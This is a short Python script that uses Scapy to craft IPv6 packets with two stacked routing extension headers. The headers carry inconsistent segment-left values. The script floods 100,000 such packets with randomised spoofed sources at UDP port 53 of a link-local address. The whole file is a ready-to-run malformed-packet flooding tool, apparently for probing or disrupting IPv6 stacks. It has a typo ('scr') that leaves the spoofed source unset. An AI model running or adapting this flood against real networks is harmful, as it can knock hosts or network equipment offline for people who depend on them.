from scapy.all import *
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6, IPv6ExtHdrRouting

number_packets = 100000
destination = "fe80::a00:27ff:fe4c:1052"
source = RandIP6()
s_port = 1055
d_port = 53


def multi_routing_header():
    # Create IPv6 Packet
    ipv6 = IPv6()
    ipv6.scr = source
    ipv6.dst = destination
    ipv6.nh = 43
    next0 = IPv6ExtHdrRouting(addresses=['5::5', '6::6'], nh=43, segleft=4)
    next1 = IPv6ExtHdrRouting(addresses=['5::5', '6::6'], nh=17, segleft=4)
    udp = UDP(sport=s_port, dport=d_port, len=100)
    payload = ('x' * 100)
    packets = ipv6 / next0 / next1 / udp / payload
    packets.show()
    send(packets, count=int(number_packets))


multi_routing_header()
